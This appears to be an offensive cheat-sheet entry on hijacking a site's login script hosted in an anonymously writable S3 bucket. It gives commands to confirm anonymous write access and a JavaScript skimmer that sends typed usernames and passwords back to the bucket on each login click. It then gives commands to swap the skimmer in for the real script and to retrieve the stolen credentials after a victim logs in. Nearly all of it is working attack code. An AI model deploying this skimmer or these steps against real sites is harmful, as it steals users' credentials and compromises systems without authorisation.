# Public S3 Write Access Supply-Chain JS Injection

If a site loads a security-relevant script (login/auth handling) directly from an S3 bucket, and that bucket allows anonymous writes, you don't need to break the app's logic at all — just overwrite the script it trusts.

```bash
aws s3 ls s3://<bucket> --no-sign-request                      # confirm anonymous list/read
echo test > test.txt && aws s3 cp test.txt s3://<bucket>/test.txt --no-sign-request   # confirm anonymous write
```
Replace the legitimate script with a version that keeps its original behavior but also exfiltrates form fields on submit, writing the capture straight back to the same open bucket (no external listener needed):
```js
document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('#login-btn').addEventListener('click', () => {
    const body = `username=${document.querySelector('#username').value}\npassword=${document.querySelector('#password').value}`;
    fetch(`https://<bucket>.s3.amazonaws.com/creds-${Date.now()}.txt`, {method:'PUT', body});
  });
});
```
```bash
aws s3 cp malicious.js s3://<bucket>/<original-script-path> --no-sign-request
# wait for a victim login, then:
aws s3 ls s3://<bucket> --no-sign-request
curl https://<bucket>.s3.amazonaws.com/creds-<timestamp>.txt
```
